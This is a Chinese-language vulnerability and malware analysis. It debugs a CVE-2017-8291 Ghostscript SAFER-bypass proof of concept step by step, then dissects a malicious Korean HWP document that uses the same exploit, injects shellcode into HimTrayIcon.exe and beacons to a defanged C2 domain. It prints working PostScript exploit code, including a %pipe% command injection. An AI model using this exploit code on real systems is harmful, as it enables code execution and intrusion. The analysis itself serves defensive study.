Part4是修改currentdevice对象属性为string，并保存至`sdevice`数组中，之后再覆盖其LockSafetyParams属性，达到Bypass
SAFER。
三个`.eqproc`语句上移osp是因为后面会有`sdevice`、0、`currentdevice`入栈。修改POC如下，便于设断：
    (before zeqproc) print
    .eqproc
    .eqproc
    .eqproc
    sdevice 0
    currentdevice
    (before convert) print
    buffersearchvars 3 get buffersearchvars 4 get 16#7e put
    buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put
    buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put
    (after convert) print
    put
    buffersearchvars 0 get array aload
    sdevice 0 get
    16#3e8 0 put
    sdevice 0 get
    16#3b0 0 put
    sdevice 0 get
    16#3f0 0 put
    (bypass SAFER) print
于`zprint`断下后，查看上移前osp：
    gdb-peda$ p osp
    $1 = (s_ptr) 0x5555574fc968
    gdb-peda$ x /10gx osp-3
    0x5555574fc938:    0x0000000000000000    0x0000000000000000        //sdevice
    0x5555574fc948:    0x0000000000000000    0x0000000000000000        //0
    0x5555574fc958:    0xffffffffffff0100    0xffffffffffff0000        //currentdevice
    0x5555574fc968:    0x0000000effff127e    0x00005555572d8140
    0x5555574fc978:    0x00000001ffff04fe    0x00005555572d6c40
    gdb-peda$ hexdump 0x00005555572d8140
    0x00005555572d8140 : 62 65 66 6f 72 65 20 7a 65 71 70 72 6f 63 ed 3e   before zeqproc.>
`c`继续向下执行：
    gdb-peda$ p osp
    $2 = (s_ptr) 0x5555574fc968
    gdb-peda$ x /10gx osp-3
    0x5555574fc938:    0x00000001ffff047e    0x00005555575d4428
    0x5555574fc948:    0x00000252ffff0b02    0x0000000000000000
    0x5555574fc958:    0xffffffffffff1378    0x000055555709d488
    0x5555574fc968:    0x0000000effff127e    0x00005555572d812a
    0x5555574fc978:    0x00000001ffff04fe    0x00005555572d6c40
    gdb-peda$ hexdump 0x00005555572d812a
    0x00005555572d812a : 62 65 66 6f 72 65 20 63 6f 6e 76 65 72 74 96 3f   before convert.?
可以看到`currentdevice`已经覆盖掉之前的字符串buffers[N]，接下来的三条语句修改其属性：
    buffersearchvars 3 get buffersearchvars 4 get 16#7e put
    buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put    %0x127e表示string
    buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put    %修改size
关于属性各字段定义见tas_s结构(位于/psi/iref.h))：
    struct tas_s {
    /* type_attrs is a single element for fast dispatching in the interpreter */
        ushort type_attrs;
        ushort _pad;
        uint32_t rsize;
    };
修改完成：
    gdb-peda$ c
    ......
    gdb-peda$ p osp
    $2 = (s_ptr) 0x5555574fc968
    gdb-peda$ x /10gx osp-3
    0x5555574fc938:    0x00000001ffff047e    0x00005555575d4428
    0x5555574fc948:    0x00000252ffff0b02    0x0000000000000000
    0x5555574fc958:    0xffffffffffff127e    0x000055555709d488
    0x5555574fc968:    0x0000000dffff127e    0x00005555572d8115
    0x5555574fc978:    0x00000002ffff0b02    0x000000000000a5f9
    gdb-peda$ hexdump 0x00005555572d8115
    0x00005555572d8115 : 61 66 74 65 72 20 63 6f 6e 76 65 72 74 97 3f 00   after convert.?.
查看此时的`LockSafetyParams`值：
    gdb-peda$ x /4gx 0x000055555709d488+0x3e8
    0x55555709d870:    0x0000000000000001    0x0000000000000000
    0x55555709d880:    0x0000000000000000    0x0000000000000000
    gdb-peda$ x /4gx 0x000055555709d488+0x3b0
    0x55555709d838:    0x0000000000000000    0x0000000000000000
    0x55555709d848:    0x0000000000000000    0x0000000000000000
    gdb-peda$ x /4gx 0x000055555709d488+0x3f0
    0x55555709d878:    0x0000000000000000    0x0000000000000000
    0x55555709d888:    0x0000000000000000    0x0000000000000000
可以看到偏移`0x3e8`处值为1(另外两处偏移应该是针对其他系统或版本)。`LockSafetyParams`属性见`gx_device_s`结构(位于\base\gxdevcli.h)。
最后通过`.putdeviceparams`(实现位于/psi/zdevice.c)设置`/OutputFile`为`(%pipe%echo
vulnerable > /dev/tty)`，`.outputpage`完成调用。
## 0x02 样本分析
> 样本名称：(첨부2)20-0206_법인_운영상황_평가표_서식(법인작성용).hwp
>
> MD5：8AD471517E7457EB6EEA5E3039A3334F
#### 0x02.1 文档分析
HwpScan2查看该文档，可以看到其中的EPS脚本：
导出解压后的PS脚本，解密其中的`ar`变量：
解密出来之后可以看到其中CVE-2017-8291利用部分：
    label13 label10 aload 
    /label82 true def 
    /label83 0 def 
    { 
        .eqproc 
        /label84 true def 
        /label69 0 def 
        label6                                      
        { 
            /label84 true def 
            /label3 label7 label69 get def            
            /label85 label3 length 16#20 sub def    
            label3 label85 get 
            {   
                label84 
                { /label84 false def } 
                { /label84 true def exit } 
                ifelse 
            } 
            repeat 
            label84 
                { /label82 false def exit } 
            if 
            /label69 label69 1 add def 
        } 
        repeat 
        label84 
            { /label82 false def exit } 
        if 
        /label83 label83 1 add def 
    } 
    loop 
    label82 
        { quit } 
        { } 
    ifelse 
    label2 0 label2 
    label3 label85 16#18 add 16#7E put 
    label3 label85 16#19 add 16#12 put 
    label3 label85 16#1A add 16#00 put 
    label3 label85 16#1B add 16#80 put 
    put
继续向下分析，可以看到其调用了`VirtualProtect()`：
`OllDbg`中打开`gbb.exe`，之后修改命令行，其参数为打开文档后于Temp目录下释放的EPS脚本(即HwpScan2中的BIN0001.eps)完整路径：
于`VirtualProtect()`函数处设断后F9，成功断下：
通过ECX给sub_02544D7D传递参数获取系统函数调用地址：
调用`GetComputerName()`获取计算机名并于其后添加经过计算的十六进制值，之后通过异或及指定运算来为即将创建的文件命名：
于临时目录下创建文件：
之后再次计算一文件名并创建文件：
调用`ZwQuerySystemInformation()`遍历系统所有打开的句柄，此时`SystemInformationClass=SystemHandleInformation`，若缓冲区不足则把申请内存的大小扩大一倍之后调用`RtlReAllocateHeap()`再次申请，直至成功为止：
接下来调用`ZwQueryObject()`查询对象的类型，找到打开的EPS文件：
使用`CreateFileMapping()`和`MapViewOfFile()`函数将EPS文件映射到进程内存空间中：
映射完成：
移动指针指向EPS脚本最后部分(即使用HwpScan2查看文档时截图中红色箭头所指处)：
调用`VirtualAlloc()`函数为其开辟内存空间：
解密并写入到分配的内存空间中：
实际上解密后的该部分将被注入到`HimTrayIcon.exe`进程中，详见下文分析。  
获取当前系统内所有进程的快照之后通过`Process32Next()`枚举进程：
遍历线程，找到`HimTrayIcon.exe`之后打开并挂起线程：
将解密出来的Shellcode写入到进程：
之后调用`RtlCreateUserThread()`函数恢复线程的执行。最终释放内存空间并退出：
#### 0x02.2 注入Shellcode分析
其注入Shellcode可以附加`HimTrayIcon.exe`之后调试，亦可将Shellcode转成exe之后调试，笔者选择转成exe之后再进行调试。解密内存中的PE文件：
获取系统文件夹并拼接路径：
创建进程：
调用`GetThreadContext()`函数，若失败则直接`TerminateProcess`：
获取系统版本信息，以此来判断下一步如何执行：
多次调用`WriteProcessMemory()`函数于创建的进程中写入PE文件内容：
恢复线程执行：
#### 0x02.3 `userinit.exe`分析
首先是创建一互斥对象并判断是否存在相同名称的互斥对象：
之后为当前进程获取`SeDebugPrivilege`权限：
通过注册表判断当前运行环境是否为虚拟机中运行：
若非虚拟机运行环境，则获取函数调用地址：
于`%APPDATA%`目录下创建一`\Microsoft\Network`子目录：
其中`xyz`文件用于存储后续收集到的主机信息。于临时目录下创建一`.bat`文件(据系统时间随机命名)：
之后向该文件内写入内容，同时调用`WinExec()`执行之，用于获取主机信息：
加密获取到的主机信息：
之后拼接请求参数：
向`http://pingball[.]mygamesonline[.]org/home/jpg/post.php`发送加密后数据：
接下来向`http://pingball[.]mygamesonline[.]org/home/jpg/download.php`请求下一阶段载荷：
若下载成功，将其写入到`zyx.dll`文件中：
由于并未获取到该文件，故分析到此结束。
## 0x03 参考链接
  * [Wikipedia](https://zh.wikipedia.org/wiki/PostScript)
  * [官方参考文档](https://web.archive.org/web/20170218093716/https://www.adobe.com/products/postscript/pdfs/PLRM.pdf)
  * [POC](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2017-8291/msf.eps)
  * [Ghostscript 9.21](https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs921)
  * [GhostButt - CVE-2017-8291利用分析](https://paper.seebug.org/310)
  * [如何把shellcode转换成exe文件分析](https://www.freebuf.com/articles/web/152879.html)